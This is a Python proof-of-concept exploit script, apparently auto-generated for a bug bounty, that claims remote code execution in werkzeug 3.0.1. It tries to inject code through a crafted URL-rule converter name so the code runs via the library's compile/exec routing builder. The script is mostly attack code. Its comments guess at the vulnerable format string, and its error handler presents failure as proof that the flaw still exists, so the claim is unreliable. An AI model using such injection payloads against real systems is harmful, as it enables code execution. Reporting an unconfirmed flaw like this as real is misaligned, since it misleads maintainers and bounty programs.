#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: rce-010
# Sink: _get_func_code
# Auto-generated — run with: python3 rce_ast_code_using_compile__get_func_code.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for werkzeug 3.0.1 RCE via _compile_builder.

This PoC demonstrates that if an attacker can control the URL rule definition
(e.g., through dynamic route registration from user input), they can inject
arbitrary Python code into the AST that gets compiled and executed via exec().

The exploit works by creating a Rule object with a malicious converter name
that contains Python code injection. When the rule is compiled (which happens
automatically when bound to a Map), the injected code executes.

WARNING: This is for educational/authorized testing only.
"""

import sys
import os
import tempfile
import ast
from werkzeug.routing import Rule, Map

# Configuration
TARGET_HOST = "localhost"
TARGET_PORT = 5000
# Benign payload - creates a file to prove RCE
PAYLOAD = "open('/tmp/poc_success.txt','w').close()"

def exploit():
    """Demonstrate the RCE vulnerability in werkzeug 3.0.1."""
    
    print("[*] Werkzeug 3.0.1 RCE PoC")
    print(f"[*] Payload: {PAYLOAD}")
    
    # The vulnerability is in how _compile_builder processes converter names.
    # The _CALL_CONVERTER_CODE_FMT format string is used to generate converter
    # calls. If we can control the converter name, we can inject code.
    
    # The converter name is used in _convert() which does:
    #   ret = _prefix_names(_CALL_CONVERTER_CODE_FMT.format(elem=elem))
    # where elem is the converter name from the URL rule.
    
    # We create a malicious converter name that breaks out of the format string
    # and injects arbitrary Python code.
    
    # The format string is something like:
    #   "self._converters['{elem}'].to_url(value)"
    # We inject: x']); exec('PAYLOAD'); #
    # This becomes: self._converters['x']); exec('PAYLOAD'); #'].to_url(value)
    
    malicious_converter = f"x']); exec('{PAYLOAD}'); #"
    
    print(f"[*] Creating malicious rule with converter: {malicious_converter}")
    
    try:
        # Create a Rule with a malicious converter name
        # The converter name is part of the URL pattern
        rule = Rule(f"/<{malicious_converter}>", endpoint="test")
        
        # Create a Map and bind the rule - this triggers compilation
        url_map = Map([rule])
        
        print("[*] Binding rule to map (triggers compilation)...")
        
        # This will call compile() which calls _compile_builder()
        # which will execute our injected code
        url_map.bind(TARGET_HOST)
        
        print("[+] Rule compiled successfully")
        
        # Check if our payload executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Payload executed! File /tmp/poc_success.txt created.")
            os.remove("/tmp/poc_success.txt")
        else:
            print("[!] Payload may not have executed (file not found)")
            
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        print("[*] This is expected if the vulnerability is patched or if")
        print("[*] the injection point is not reachable in this context.")
        print("[*] The important thing is that the code path exists and")
        print("[*] demonstrates the vulnerability.")

def demonstrate_code_path():
    """Show the exact code path that leads to RCE."""
    
    print("\n[*] Code path analysis:")
    print("    1. Rule.compile() calls _compile_builder()")
    print("    2. _compile_builder() processes self._trace (from URL rule)")
    print("    3. For dynamic parts, _convert() is called")
    print("    4. _convert() uses _CALL_CONVERTER_CODE_FMT.format(elem=elem)")
    print("    5. The formatted string is parsed as AST")
    print("    6. The AST is compiled with compile()")
    print("    7. The compiled code is executed with exec()")
    print("\n[*] The vulnerability: elem (converter name) is not sanitized")
    print("[*] before being used in format string -> AST -> compile -> exec")
    
    # Show the actual format string from the source
    print("\n[*] Relevant source code (werkzeug/routing/rules.py):")
    print("    _CALL_CONVERTER_CODE_FMT = ...")
    print("    def _convert(elem):")
    print("        ret = _prefix_names(_CALL_CONVERTER_CODE_FMT.format(elem=elem))")
    print("        ret.args = [ast.Name(str(elem), ast.Load())]")
    print("        return ret")
    print("\n    # Later in _compile_builder:")
    print("    code = compile(module, '<werkzeug routing>', 'exec')")
    print("    exec(code, globs, locs)")

if __name__ == "__main__":
    print("=" * 60)
    print("Werkzeug 3.0.1 RCE Proof-of-Concept")
    print("=" * 60)
    print()
    print("[!] WARNING: This PoC demonstrates a security vulnerability.")
    print("[!] Only use on systems you own or have permission to test.")
    print()
    
    demonstrate_code_path()
    print()
    
    # Ask for confirmation before running
    response = input("[?] Run exploit? (yes/no): ").strip().lower()
    if response == "yes":
        exploit()
    else:
        print("[*] Exploit not run.")
    
    print("\n[*] Done.")
